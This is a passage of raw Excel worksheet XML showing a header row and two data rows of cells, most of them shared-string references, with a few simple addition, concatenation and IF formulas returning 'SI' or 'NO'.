      <c r="BS2" s="191" t="s">
        <v>2783</v>
      </c>
      <c r="BT2" s="191" t="s">
        <v>2786</v>
      </c>
      <c r="BU2" s="191" t="s">
        <v>2791</v>
      </c>
      <c r="BV2" s="191" t="s">
        <v>2792</v>
      </c>
      <c r="BW2" s="200" t="s">
        <v>2781</v>
      </c>
      <c r="BX2" s="201" t="s">
        <v>2795</v>
      </c>
      <c r="BY2" s="202" t="s">
        <v>2796</v>
      </c>
      <c r="BZ2" s="202" t="s">
        <v>2809</v>
      </c>
      <c r="CA2" s="203" t="s">
        <v>2553</v>
      </c>
      <c r="CB2" s="203" t="s">
        <v>103</v>
      </c>
      <c r="CC2" s="203" t="s">
        <v>104</v>
      </c>
      <c r="CD2" s="203" t="s">
        <v>105</v>
      </c>
      <c r="CE2" s="203" t="s">
        <v>2797</v>
      </c>
      <c r="CF2" s="203" t="s">
        <v>130</v>
      </c>
      <c r="CG2" s="203" t="s">
        <v>131</v>
      </c>
      <c r="CH2" s="203" t="s">
        <v>2811</v>
      </c>
      <c r="CI2" s="204" t="s">
        <v>2798</v>
      </c>
      <c r="CJ2" s="204" t="s">
        <v>2799</v>
      </c>
      <c r="CK2" s="204" t="s">
        <v>2800</v>
      </c>
      <c r="CL2" s="204" t="s">
        <v>2801</v>
      </c>
      <c r="CM2" s="204" t="s">
        <v>2802</v>
      </c>
      <c r="CN2" s="205" t="s">
        <v>2803</v>
      </c>
      <c r="CO2" s="205" t="s">
        <v>2804</v>
      </c>
      <c r="CP2" s="206" t="s">
        <v>2805</v>
      </c>
      <c r="CQ2" s="206" t="s">
        <v>2806</v>
      </c>
      <c r="CR2" s="206" t="s">
        <v>2807</v>
      </c>
      <c r="CS2" s="206" t="s">
        <v>2808</v>
      </c>
      <c r="CT2" s="200" t="s">
        <v>2781</v>
      </c>
      <c r="CU2" s="201" t="s">
        <v>2795</v>
      </c>
      <c r="CV2" s="202" t="s">
        <v>2796</v>
      </c>
      <c r="CW2" s="202" t="s">
        <v>2809</v>
      </c>
      <c r="CX2" s="203" t="s">
        <v>2553</v>
      </c>
      <c r="CY2" s="203" t="s">
        <v>103</v>
      </c>
      <c r="CZ2" s="203" t="s">
        <v>104</v>
      </c>
      <c r="DA2" s="203" t="s">
        <v>105</v>
      </c>
      <c r="DB2" s="203" t="s">
        <v>2797</v>
      </c>
      <c r="DC2" s="203" t="s">
        <v>130</v>
      </c>
      <c r="DD2" s="203" t="s">
        <v>131</v>
      </c>
      <c r="DE2" s="203" t="s">
        <v>2811</v>
      </c>
      <c r="DF2" s="204" t="s">
        <v>2798</v>
      </c>
      <c r="DG2" s="204" t="s">
        <v>2799</v>
      </c>
      <c r="DH2" s="204" t="s">
        <v>2800</v>
      </c>
      <c r="DI2" s="204" t="s">
        <v>2801</v>
      </c>
      <c r="DJ2" s="204" t="s">
        <v>2802</v>
      </c>
      <c r="DK2" s="205" t="s">
        <v>2803</v>
      </c>
      <c r="DL2" s="205" t="s">
        <v>2804</v>
      </c>
      <c r="DM2" s="206" t="s">
        <v>2805</v>
      </c>
      <c r="DN2" s="206" t="s">
        <v>2806</v>
      </c>
      <c r="DO2" s="206" t="s">
        <v>2807</v>
      </c>
      <c r="DP2" s="206" t="s">
        <v>2808</v>
      </c>
      <c r="DQ2" s="200" t="s">
        <v>2781</v>
      </c>
      <c r="DR2" s="201" t="s">
        <v>2795</v>
      </c>
      <c r="DS2" s="202" t="s">
        <v>2796</v>
      </c>
      <c r="DT2" s="202" t="s">
        <v>2809</v>
      </c>
      <c r="DU2" s="203" t="s">
        <v>2553</v>
      </c>
      <c r="DV2" s="203" t="s">
        <v>103</v>
      </c>
      <c r="DW2" s="203" t="s">
        <v>104</v>
      </c>
      <c r="DX2" s="203" t="s">
        <v>105</v>
      </c>
      <c r="DY2" s="203" t="s">
        <v>2797</v>
      </c>
      <c r="DZ2" s="203" t="s">
        <v>130</v>
      </c>
      <c r="EA2" s="203" t="s">
        <v>131</v>
      </c>
      <c r="EB2" s="203" t="s">
        <v>2811</v>
      </c>
      <c r="EC2" s="204" t="s">
        <v>2798</v>
      </c>
      <c r="ED2" s="204" t="s">
        <v>2799</v>
      </c>
      <c r="EE2" s="204" t="s">
        <v>2800</v>
      </c>
      <c r="EF2" s="204" t="s">
        <v>2801</v>
      </c>
      <c r="EG2" s="204" t="s">
        <v>2802</v>
      </c>
      <c r="EH2" s="205" t="s">
        <v>2803</v>
      </c>
      <c r="EI2" s="205" t="s">
        <v>2804</v>
      </c>
      <c r="EJ2" s="206" t="s">
        <v>2805</v>
      </c>
      <c r="EK2" s="206" t="s">
        <v>2806</v>
      </c>
      <c r="EL2" s="206" t="s">
        <v>2807</v>
      </c>
      <c r="EM2" s="206" t="s">
        <v>2808</v>
      </c>
      <c r="EN2" s="207" t="s">
        <v>154</v>
      </c>
      <c r="EO2" s="208" t="s">
        <v>2781</v>
      </c>
      <c r="EP2" s="209" t="s">
        <v>2795</v>
      </c>
      <c r="EQ2" s="210" t="s">
        <v>2825</v>
      </c>
      <c r="ER2" s="210" t="s">
        <v>142</v>
      </c>
      <c r="ES2" s="203" t="s">
        <v>2812</v>
      </c>
      <c r="ET2" s="191" t="s">
        <v>147</v>
      </c>
      <c r="EU2" s="191" t="s">
        <v>148</v>
      </c>
      <c r="EV2" s="191" t="s">
        <v>2813</v>
      </c>
      <c r="EW2" s="211" t="s">
        <v>2818</v>
      </c>
      <c r="EX2" s="211" t="s">
        <v>2819</v>
      </c>
      <c r="EY2" s="212" t="s">
        <v>2820</v>
      </c>
      <c r="EZ2" s="211" t="s">
        <v>2821</v>
      </c>
      <c r="FA2" s="211" t="s">
        <v>2822</v>
      </c>
      <c r="FB2" s="211" t="s">
        <v>2823</v>
      </c>
      <c r="FC2" s="190" t="s">
        <v>2816</v>
      </c>
      <c r="FD2" s="190" t="s">
        <v>2817</v>
      </c>
      <c r="FE2" s="190" t="s">
        <v>2826</v>
      </c>
      <c r="FF2" s="190" t="s">
        <v>2827</v>
      </c>
      <c r="FG2" s="190" t="s">
        <v>2802</v>
      </c>
      <c r="FH2" s="175" t="s">
        <v>2824</v>
      </c>
      <c r="FI2" s="213" t="s">
        <v>173</v>
      </c>
      <c r="FJ2" s="208" t="s">
        <v>2781</v>
      </c>
      <c r="FK2" s="209" t="s">
        <v>2795</v>
      </c>
      <c r="FL2" s="192" t="s">
        <v>2830</v>
      </c>
      <c r="FM2" s="210" t="s">
        <v>163</v>
      </c>
      <c r="FN2" s="203" t="s">
        <v>2831</v>
      </c>
      <c r="FO2" s="191" t="s">
        <v>2834</v>
      </c>
      <c r="FP2" s="191" t="s">
        <v>2833</v>
      </c>
      <c r="FQ2" s="191" t="s">
        <v>2832</v>
      </c>
      <c r="FR2" s="211" t="s">
        <v>2818</v>
      </c>
      <c r="FS2" s="211" t="s">
        <v>2819</v>
      </c>
      <c r="FT2" s="212" t="s">
        <v>2820</v>
      </c>
      <c r="FU2" s="211" t="s">
        <v>2821</v>
      </c>
      <c r="FV2" s="211" t="s">
        <v>2822</v>
      </c>
      <c r="FW2" s="211" t="s">
        <v>2823</v>
      </c>
      <c r="FX2" s="190" t="s">
        <v>2835</v>
      </c>
      <c r="FY2" s="190" t="s">
        <v>2836</v>
      </c>
      <c r="FZ2" s="190" t="s">
        <v>2837</v>
      </c>
      <c r="GA2" s="190" t="s">
        <v>2827</v>
      </c>
      <c r="GB2" s="190" t="s">
        <v>2802</v>
      </c>
      <c r="GC2" s="214" t="s">
        <v>2824</v>
      </c>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row>
    <row r="3" spans="1:321" ht="39.75" customHeight="1">
      <c r="B3" s="215" t="s">
        <v>176</v>
      </c>
      <c r="C3" s="216" t="s">
        <v>12</v>
      </c>
      <c r="D3" s="216" t="s">
        <v>177</v>
      </c>
      <c r="E3" s="216" t="s">
        <v>178</v>
      </c>
      <c r="F3" s="216">
        <v>1</v>
      </c>
      <c r="G3" s="216" t="s">
        <v>179</v>
      </c>
      <c r="H3" s="217" t="s">
        <v>180</v>
      </c>
      <c r="I3" s="216">
        <v>2</v>
      </c>
      <c r="J3" s="216" t="s">
        <v>181</v>
      </c>
      <c r="K3" s="218" t="s">
        <v>182</v>
      </c>
      <c r="L3" s="219" t="s">
        <v>185</v>
      </c>
      <c r="M3" s="218" t="s">
        <v>183</v>
      </c>
      <c r="N3" s="218" t="s">
        <v>184</v>
      </c>
      <c r="O3" s="388" t="s">
        <v>2662</v>
      </c>
      <c r="P3" s="392" t="s">
        <v>191</v>
      </c>
      <c r="Q3" s="216" t="s">
        <v>191</v>
      </c>
      <c r="R3" s="216"/>
      <c r="S3" s="395"/>
      <c r="T3" s="278" t="s">
        <v>191</v>
      </c>
      <c r="U3" s="221" t="s">
        <v>195</v>
      </c>
      <c r="V3" s="222" t="s">
        <v>191</v>
      </c>
      <c r="W3" s="222"/>
      <c r="X3" s="223" t="s">
        <v>192</v>
      </c>
      <c r="Y3" s="250" t="s">
        <v>186</v>
      </c>
      <c r="Z3" s="251" t="s">
        <v>187</v>
      </c>
      <c r="AA3" s="252" t="s">
        <v>2410</v>
      </c>
      <c r="AB3" s="251" t="s">
        <v>2521</v>
      </c>
      <c r="AC3" s="217" t="s">
        <v>12</v>
      </c>
      <c r="AD3" s="253" t="s">
        <v>193</v>
      </c>
      <c r="AE3" s="254" t="s">
        <v>194</v>
      </c>
      <c r="AF3" s="268" t="s">
        <v>188</v>
      </c>
      <c r="AG3" s="216" t="s">
        <v>189</v>
      </c>
      <c r="AH3" s="269" t="s">
        <v>190</v>
      </c>
      <c r="AI3" s="278" t="s">
        <v>13</v>
      </c>
      <c r="AJ3" s="220" t="s">
        <v>192</v>
      </c>
      <c r="AK3" s="220" t="s">
        <v>13</v>
      </c>
      <c r="AL3" s="220" t="s">
        <v>192</v>
      </c>
      <c r="AM3" s="220" t="s">
        <v>13</v>
      </c>
      <c r="AN3" s="279" t="s">
        <v>192</v>
      </c>
      <c r="AO3" s="284" t="s">
        <v>13</v>
      </c>
      <c r="AP3" s="221"/>
      <c r="AQ3" s="221"/>
      <c r="AR3" s="285">
        <v>1</v>
      </c>
      <c r="AS3" s="285">
        <v>1</v>
      </c>
      <c r="AT3" s="285">
        <v>0</v>
      </c>
      <c r="AU3" s="285">
        <f>AS3+AT3</f>
        <v>1</v>
      </c>
      <c r="AV3" s="251" t="s">
        <v>12</v>
      </c>
      <c r="AW3" s="285">
        <v>1</v>
      </c>
      <c r="AX3" s="285">
        <v>1</v>
      </c>
      <c r="AY3" s="285">
        <v>0</v>
      </c>
      <c r="AZ3" s="285">
        <f t="shared" ref="AZ3:AZ17" si="0">AX3+AY3</f>
        <v>1</v>
      </c>
      <c r="BA3" s="286"/>
      <c r="BB3" s="296">
        <v>0</v>
      </c>
      <c r="BC3" s="297">
        <v>0</v>
      </c>
      <c r="BD3" s="297" t="s">
        <v>12</v>
      </c>
      <c r="BE3" s="297">
        <v>0</v>
      </c>
      <c r="BF3" s="298" t="s">
        <v>13</v>
      </c>
      <c r="BG3" s="297" t="s">
        <v>12</v>
      </c>
      <c r="BH3" s="297" t="s">
        <v>12</v>
      </c>
      <c r="BI3" s="297" t="s">
        <v>12</v>
      </c>
      <c r="BJ3" s="297" t="str">
        <f>BK3 &amp; ", " &amp; BL3</f>
        <v>-, -</v>
      </c>
      <c r="BK3" s="297" t="s">
        <v>12</v>
      </c>
      <c r="BL3" s="297" t="s">
        <v>12</v>
      </c>
      <c r="BM3" s="297">
        <v>0</v>
      </c>
      <c r="BN3" s="299">
        <v>1</v>
      </c>
      <c r="BO3" s="299">
        <v>0</v>
      </c>
      <c r="BP3" s="299">
        <v>0</v>
      </c>
      <c r="BQ3" s="299">
        <v>0</v>
      </c>
      <c r="BR3" s="299">
        <f>BP3+BQ3</f>
        <v>0</v>
      </c>
      <c r="BS3" s="299">
        <v>0</v>
      </c>
      <c r="BT3" s="299">
        <v>0</v>
      </c>
      <c r="BU3" s="299">
        <v>0</v>
      </c>
      <c r="BV3" s="300">
        <v>0</v>
      </c>
      <c r="BW3" s="313">
        <v>0</v>
      </c>
      <c r="BX3" s="314">
        <v>0</v>
      </c>
      <c r="BY3" s="314" t="s">
        <v>12</v>
      </c>
      <c r="BZ3" s="314">
        <v>0</v>
      </c>
      <c r="CA3" s="314" t="s">
        <v>13</v>
      </c>
      <c r="CB3" s="314" t="s">
        <v>12</v>
      </c>
      <c r="CC3" s="314" t="s">
        <v>12</v>
      </c>
      <c r="CD3" s="314" t="s">
        <v>12</v>
      </c>
      <c r="CE3" s="314" t="str">
        <f>CF3 &amp; ", " &amp; CG3</f>
        <v>-, -</v>
      </c>
      <c r="CF3" s="314" t="s">
        <v>12</v>
      </c>
      <c r="CG3" s="314" t="s">
        <v>12</v>
      </c>
      <c r="CH3" s="314">
        <v>0</v>
      </c>
      <c r="CI3" s="315">
        <v>1</v>
      </c>
      <c r="CJ3" s="315">
        <v>0</v>
      </c>
      <c r="CK3" s="315">
        <v>0</v>
      </c>
      <c r="CL3" s="315">
        <v>0</v>
      </c>
      <c r="CM3" s="315">
        <f>CK3+CL3</f>
        <v>0</v>
      </c>
      <c r="CN3" s="315">
        <v>0</v>
      </c>
      <c r="CO3" s="315">
        <v>0</v>
      </c>
      <c r="CP3" s="315">
        <v>0</v>
      </c>
      <c r="CQ3" s="315">
        <v>0</v>
      </c>
      <c r="CR3" s="315">
        <v>0</v>
      </c>
      <c r="CS3" s="316">
        <v>0</v>
      </c>
      <c r="CT3" s="335">
        <v>0</v>
      </c>
      <c r="CU3" s="336">
        <v>0</v>
      </c>
      <c r="CV3" s="336" t="s">
        <v>12</v>
      </c>
      <c r="CW3" s="336">
        <v>0</v>
      </c>
      <c r="CX3" s="336"/>
      <c r="CY3" s="336" t="s">
        <v>12</v>
      </c>
      <c r="CZ3" s="336" t="s">
        <v>12</v>
      </c>
      <c r="DA3" s="336" t="s">
        <v>12</v>
      </c>
      <c r="DB3" s="336" t="str">
        <f>DC3 &amp; ", " &amp; DD3</f>
        <v>-, -</v>
      </c>
      <c r="DC3" s="336" t="s">
        <v>12</v>
      </c>
      <c r="DD3" s="336" t="s">
        <v>12</v>
      </c>
      <c r="DE3" s="336">
        <v>0</v>
      </c>
      <c r="DF3" s="337">
        <v>1</v>
      </c>
      <c r="DG3" s="337">
        <v>0</v>
      </c>
      <c r="DH3" s="337">
        <v>0</v>
      </c>
      <c r="DI3" s="337">
        <v>0</v>
      </c>
      <c r="DJ3" s="337">
        <f>DH3+DI3</f>
        <v>0</v>
      </c>
      <c r="DK3" s="337">
        <v>0</v>
      </c>
      <c r="DL3" s="337">
        <v>0</v>
      </c>
      <c r="DM3" s="337">
        <v>0</v>
      </c>
      <c r="DN3" s="337">
        <v>0</v>
      </c>
      <c r="DO3" s="337">
        <v>0</v>
      </c>
      <c r="DP3" s="338">
        <v>0</v>
      </c>
      <c r="DQ3" s="351">
        <v>4</v>
      </c>
      <c r="DR3" s="352">
        <v>0</v>
      </c>
      <c r="DS3" s="352" t="s">
        <v>196</v>
      </c>
      <c r="DT3" s="352">
        <v>2</v>
      </c>
      <c r="DU3" s="352"/>
      <c r="DV3" s="352" t="s">
        <v>196</v>
      </c>
      <c r="DW3" s="352" t="s">
        <v>12</v>
      </c>
      <c r="DX3" s="352" t="s">
        <v>196</v>
      </c>
      <c r="DY3" s="352" t="str">
        <f>DZ3 &amp; ", " &amp; EA3</f>
        <v>-, -</v>
      </c>
      <c r="DZ3" s="352" t="s">
        <v>12</v>
      </c>
      <c r="EA3" s="352" t="s">
        <v>12</v>
      </c>
      <c r="EB3" s="352">
        <v>0</v>
      </c>
      <c r="EC3" s="353">
        <v>1</v>
      </c>
      <c r="ED3" s="353">
        <v>1</v>
      </c>
      <c r="EE3" s="353">
        <v>0</v>
      </c>
      <c r="EF3" s="353">
        <v>0</v>
      </c>
      <c r="EG3" s="353">
        <f>EE3+EF3</f>
        <v>0</v>
      </c>
      <c r="EH3" s="353">
        <v>2</v>
      </c>
      <c r="EI3" s="353">
        <v>0</v>
      </c>
      <c r="EJ3" s="353">
        <v>0</v>
      </c>
      <c r="EK3" s="353">
        <v>4</v>
      </c>
      <c r="EL3" s="353">
        <v>4</v>
      </c>
      <c r="EM3" s="354">
        <v>0</v>
      </c>
      <c r="EN3" s="365" t="str">
        <f t="shared" ref="EN3:EN34" si="1">IF(U3="L3","SI","NO")</f>
        <v>SI</v>
      </c>
      <c r="EO3" s="366" t="s">
        <v>12</v>
      </c>
      <c r="EP3" s="366"/>
      <c r="EQ3" s="366" t="s">
        <v>12</v>
      </c>
      <c r="ER3" s="366" t="s">
        <v>12</v>
      </c>
      <c r="ES3" s="366" t="s">
        <v>13</v>
      </c>
      <c r="ET3" s="366" t="s">
        <v>12</v>
      </c>
      <c r="EU3" s="366" t="s">
        <v>12</v>
      </c>
      <c r="EV3" s="366"/>
      <c r="EW3" s="366" t="s">
        <v>12</v>
      </c>
      <c r="EX3" s="366"/>
      <c r="EY3" s="366" t="s">
        <v>13</v>
      </c>
      <c r="EZ3" s="366" t="s">
        <v>12</v>
      </c>
      <c r="FA3" s="366"/>
      <c r="FB3" s="366"/>
      <c r="FC3" s="366">
        <v>1</v>
      </c>
      <c r="FD3" s="366">
        <f t="shared" ref="FD3:FD21" si="2">FE3+FF3</f>
        <v>0</v>
      </c>
      <c r="FE3" s="366">
        <v>0</v>
      </c>
      <c r="FF3" s="366">
        <v>0</v>
      </c>
      <c r="FG3" s="366">
        <v>0</v>
      </c>
      <c r="FH3" s="367" t="s">
        <v>12</v>
      </c>
      <c r="FI3" s="374" t="str">
        <f t="shared" ref="FI3:FI34" si="3">IF(U3="L3","SI","NO")</f>
        <v>SI</v>
      </c>
      <c r="FJ3" s="375">
        <v>1</v>
      </c>
      <c r="FK3" s="375"/>
      <c r="FL3" s="375">
        <v>31914</v>
      </c>
      <c r="FM3" s="375">
        <v>1</v>
      </c>
      <c r="FN3" s="375"/>
      <c r="FO3" s="375">
        <v>31914</v>
      </c>
      <c r="FP3" s="375" t="s">
        <v>12</v>
      </c>
      <c r="FQ3" s="375"/>
      <c r="FR3" s="375" t="s">
        <v>12</v>
      </c>
      <c r="FS3" s="375"/>
      <c r="FT3" s="375"/>
      <c r="FU3" s="375" t="s">
        <v>12</v>
      </c>
      <c r="FV3" s="375"/>
      <c r="FW3" s="375"/>
      <c r="FX3" s="375">
        <v>1</v>
      </c>
      <c r="FY3" s="375">
        <f t="shared" ref="FY3:FY40" si="4">FZ3+GA3</f>
        <v>0</v>
      </c>
      <c r="FZ3" s="375">
        <v>0</v>
      </c>
      <c r="GA3" s="375" t="s">
        <v>197</v>
      </c>
      <c r="GB3" s="375">
        <v>0</v>
      </c>
      <c r="GC3" s="376" t="s">
        <v>12</v>
      </c>
      <c r="GD3" s="39"/>
      <c r="GE3" s="39"/>
      <c r="GF3" s="39"/>
      <c r="GG3" s="39"/>
      <c r="GH3" s="39"/>
      <c r="GI3" s="39"/>
      <c r="GJ3" s="39"/>
      <c r="GK3" s="39"/>
      <c r="GL3" s="39"/>
      <c r="GM3" s="39"/>
      <c r="GN3" s="39"/>
      <c r="GO3" s="39"/>
      <c r="GP3" s="39"/>
      <c r="GQ3" s="39"/>
      <c r="GR3" s="39"/>
      <c r="GS3" s="39"/>
      <c r="GT3" s="39"/>
      <c r="GU3" s="39"/>
      <c r="GV3" s="39"/>
      <c r="GW3" s="39"/>
      <c r="GX3" s="39"/>
      <c r="GY3" s="39"/>
      <c r="GZ3" s="39"/>
      <c r="HA3" s="39"/>
      <c r="HB3" s="39"/>
      <c r="HC3" s="39"/>
      <c r="HD3" s="39"/>
      <c r="HE3" s="39"/>
      <c r="HF3" s="39"/>
      <c r="HG3" s="39"/>
      <c r="HH3" s="39"/>
      <c r="HI3" s="39"/>
      <c r="HJ3" s="39"/>
      <c r="HK3" s="39"/>
      <c r="HL3" s="39"/>
      <c r="HM3" s="39"/>
      <c r="HN3" s="39"/>
      <c r="HO3" s="39"/>
      <c r="HP3" s="39"/>
      <c r="HQ3" s="39"/>
      <c r="HR3" s="39"/>
      <c r="HS3" s="39"/>
      <c r="HT3" s="39"/>
      <c r="HU3" s="39"/>
      <c r="HV3" s="39"/>
      <c r="HW3" s="39"/>
      <c r="HX3" s="39"/>
      <c r="HY3" s="39"/>
      <c r="HZ3" s="39"/>
      <c r="IA3" s="39"/>
      <c r="IB3" s="39"/>
      <c r="IC3" s="39"/>
      <c r="ID3" s="39"/>
      <c r="IE3" s="39"/>
      <c r="IF3" s="39"/>
      <c r="IG3" s="39"/>
      <c r="IH3" s="39"/>
      <c r="II3" s="39"/>
      <c r="IJ3" s="39"/>
      <c r="IK3" s="39"/>
      <c r="IL3" s="39"/>
      <c r="IM3" s="39"/>
      <c r="IN3" s="39"/>
      <c r="IO3" s="39"/>
      <c r="IP3" s="39"/>
      <c r="IQ3" s="39"/>
      <c r="IR3" s="39"/>
      <c r="IS3" s="39"/>
      <c r="IT3" s="39"/>
      <c r="IU3" s="39"/>
      <c r="IV3" s="39"/>
      <c r="IW3" s="39"/>
      <c r="IX3" s="39"/>
      <c r="IY3" s="39"/>
      <c r="IZ3" s="39"/>
      <c r="JA3" s="39"/>
      <c r="JB3" s="39"/>
      <c r="JC3" s="39"/>
      <c r="JD3" s="39"/>
      <c r="JE3" s="39"/>
      <c r="JF3" s="39"/>
      <c r="JG3" s="39"/>
      <c r="JH3" s="39"/>
      <c r="JI3" s="39"/>
      <c r="JJ3" s="39"/>
      <c r="JK3" s="39"/>
      <c r="JL3" s="39"/>
      <c r="JM3" s="39"/>
      <c r="JN3" s="39"/>
      <c r="JO3" s="39"/>
      <c r="JP3" s="39"/>
      <c r="JQ3" s="39"/>
      <c r="JR3" s="39"/>
      <c r="JS3" s="39"/>
      <c r="JT3" s="39"/>
      <c r="JU3" s="39"/>
      <c r="JV3" s="39"/>
      <c r="JW3" s="39"/>
      <c r="JX3" s="39"/>
      <c r="JY3" s="39"/>
      <c r="JZ3" s="39"/>
      <c r="KA3" s="39"/>
      <c r="KB3" s="39"/>
      <c r="KC3" s="39"/>
      <c r="KD3" s="39"/>
      <c r="KE3" s="39"/>
      <c r="KF3" s="39"/>
      <c r="KG3" s="39"/>
      <c r="KH3" s="39"/>
      <c r="KI3" s="39"/>
      <c r="KJ3" s="39"/>
      <c r="KK3" s="39"/>
      <c r="KL3" s="39"/>
      <c r="KM3" s="39"/>
      <c r="KN3" s="39"/>
      <c r="KO3" s="39"/>
      <c r="KP3" s="39"/>
      <c r="KQ3" s="39"/>
      <c r="KR3" s="39"/>
      <c r="KS3" s="39"/>
      <c r="KT3" s="39"/>
      <c r="KU3" s="39"/>
      <c r="KV3" s="39"/>
      <c r="KW3" s="39"/>
      <c r="KX3" s="39"/>
      <c r="KY3" s="39"/>
      <c r="KZ3" s="39"/>
      <c r="LA3" s="39"/>
      <c r="LB3" s="39"/>
      <c r="LC3" s="39"/>
      <c r="LD3" s="39"/>
      <c r="LE3" s="39"/>
      <c r="LF3" s="39"/>
      <c r="LG3" s="39"/>
      <c r="LH3" s="39"/>
      <c r="LI3" s="39"/>
    </row>
    <row r="4" spans="1:321" ht="39.950000000000003" customHeight="1">
      <c r="B4" s="224" t="s">
        <v>176</v>
      </c>
      <c r="C4" s="225" t="s">
        <v>12</v>
      </c>
      <c r="D4" s="225" t="s">
        <v>177</v>
      </c>
      <c r="E4" s="225" t="s">
        <v>178</v>
      </c>
      <c r="F4" s="225">
        <v>1</v>
      </c>
      <c r="G4" s="225" t="s">
        <v>179</v>
      </c>
      <c r="H4" s="226" t="s">
        <v>198</v>
      </c>
      <c r="I4" s="225">
        <v>3</v>
      </c>
      <c r="J4" s="225" t="s">
        <v>199</v>
      </c>
      <c r="K4" s="227" t="s">
        <v>200</v>
      </c>
      <c r="L4" s="228" t="s">
        <v>203</v>
      </c>
      <c r="M4" s="227" t="s">
        <v>201</v>
      </c>
      <c r="N4" s="227" t="s">
        <v>202</v>
      </c>
      <c r="O4" s="389" t="s">
        <v>2663</v>
      </c>
      <c r="P4" s="275" t="s">
        <v>191</v>
      </c>
      <c r="Q4" s="225" t="s">
        <v>191</v>
      </c>
      <c r="R4" s="225"/>
      <c r="S4" s="396"/>
      <c r="T4" s="280" t="s">
        <v>191</v>
      </c>
      <c r="U4" s="230" t="s">
        <v>195</v>
      </c>
      <c r="V4" s="231" t="s">
        <v>191</v>
      </c>
      <c r="W4" s="231"/>
      <c r="X4" s="232" t="s">
        <v>13</v>
      </c>
      <c r="Y4" s="255" t="s">
        <v>191</v>
      </c>
      <c r="Z4" s="256" t="s">
        <v>204</v>
      </c>
      <c r="AA4" s="257" t="s">
        <v>2410</v>
      </c>
      <c r="AB4" s="256" t="s">
        <v>2516</v>
      </c>
      <c r="AC4" s="226" t="s">
        <v>12</v>
      </c>
      <c r="AD4" s="258" t="s">
        <v>193</v>
      </c>
      <c r="AE4" s="259" t="s">
        <v>208</v>
      </c>
      <c r="AF4" s="270" t="s">
        <v>205</v>
      </c>
      <c r="AG4" s="225" t="s">
        <v>206</v>
      </c>
      <c r="AH4" s="271" t="s">
        <v>207</v>
      </c>
      <c r="AI4" s="280" t="s">
        <v>13</v>
      </c>
      <c r="AJ4" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AK4" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AL4" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AM4" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AN4" s="281" t="s">
        <v>192</v>
      </c>
      <c r="AO4" s="287" t="s">
        <v>13</v>
      </c>
      <c r="AP4" s="230"/>
      <c r="AQ4" s="230"/>
      <c r="AR4" s="288">
        <v>1</v>
      </c>
      <c r="AS4" s="288">
        <v>1</v>
      </c>
      <c r="AT4" s="288">
        <v>0</v>
      </c>
      <c r="AU4" s="288">
        <f t="shared" ref="AU4:AU67" si="5">AS4+AT4</f>
        <v>1</v>
      </c>
      <c r="AV4" s="256" t="s">
        <v>12</v>
      </c>
      <c r="AW4" s="288">
        <v>1</v>
      </c>
      <c r="AX4" s="288">
        <v>1</v>
      </c>
      <c r="AY4" s="288">
        <v>0</v>
      </c>
      <c r="AZ4" s="288">
        <f t="shared" si="0"/>
        <v>1</v>
      </c>
      <c r="BA4" s="289"/>
      <c r="BB4" s="301">
        <v>0</v>
      </c>
      <c r="BC4" s="302">
        <v>0</v>
      </c>
      <c r="BD4" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BE4" s="302">
        <v>0</v>
      </c>
      <c r="BF4" s="303" t="s">
        <v>13</v>
      </c>
      <c r="BG4" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BH4" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BI4" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BJ4" s="302" t="str">
        <f t="shared" ref="BJ4:BJ67" si="6">BK4 &amp; ", " &amp; BL4</f>
        <v>-, -</v>
      </c>
      <c r="BK4" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BL4" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BM4" s="302">
        <v>0</v>
      </c>
      <c r="BN4" s="304">
        <v>1</v>
      </c>
      <c r="BO4" s="304">
        <v>0</v>
      </c>
      <c r="BP4" s="304">
        <v>0</v>
      </c>
      <c r="BQ4" s="304">
        <v>0</v>
      </c>
      <c r="BR4" s="304">
        <f t="shared" ref="BR4:BR67" si="7">BP4+BQ4</f>
        <v>0</v>
      </c>
      <c r="BS4" s="304">
        <v>0</v>
      </c>
      <c r="BT4" s="304">
        <v>0</v>
      </c>
      <c r="BU4" s="304">
        <v>0</v>
      </c>
      <c r="BV4" s="305">
        <v>0</v>
      </c>
      <c r="BW4" s="317">
        <v>0</v>
      </c>
      <c r="BX4" s="318">
        <v>0</v>
      </c>
      <c r="BY4" s="318" t="s">
        <v>12</v>
      </c>
      <c r="BZ4" s="318">
        <v>0</v>
      </c>
      <c r="CA4" s="318" t="s">
        <v>13</v>
      </c>
      <c r="CB4" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CC4" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CD4" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CE4" s="318" t="str">
        <f t="shared" ref="CE4:CE67" si="8">CF4 &amp; ", " &amp; CG4</f>
        <v>-, -</v>
      </c>
      <c r="CF4" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CG4" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CH4" s="318">
        <v>0</v>
      </c>
      <c r="CI4" s="319">
        <v>1</v>
      </c>
      <c r="CJ4" s="319">
        <v>0</v>
      </c>
      <c r="CK4" s="319">
        <v>0</v>
      </c>
      <c r="CL4" s="319">
        <v>0</v>
      </c>
      <c r="CM4" s="319">
        <f t="shared" ref="CM4:CM67" si="9">CK4+CL4</f>
        <v>0</v>
      </c>
      <c r="CN4" s="319">
        <v>0</v>
      </c>
      <c r="CO4" s="319">
        <v>0</v>
      </c>
      <c r="CP4" s="319">
        <v>0</v>
      </c>
      <c r="CQ4" s="319">
        <v>0</v>
      </c>
      <c r="CR4" s="319">
        <v>0</v>
      </c>
      <c r="CS4" s="320">
        <v>0</v>
      </c>
      <c r="CT4" s="339">
        <v>0</v>
      </c>
      <c r="CU4" s="340">
        <v>0</v>
      </c>
      <c r="CV4" s="340" t="s">
        <v>12</v>
      </c>
      <c r="CW4" s="340">
        <v>0</v>
      </c>
      <c r="CX4" s="340"/>
      <c r="CY4" s="340" t="s">
        <v>12</v>
      </c>
      <c r="CZ4" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DA4" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DB4" s="340" t="str">
        <f t="shared" ref="DB4:DB67" si="10">DC4 &amp; ", " &amp; DD4</f>
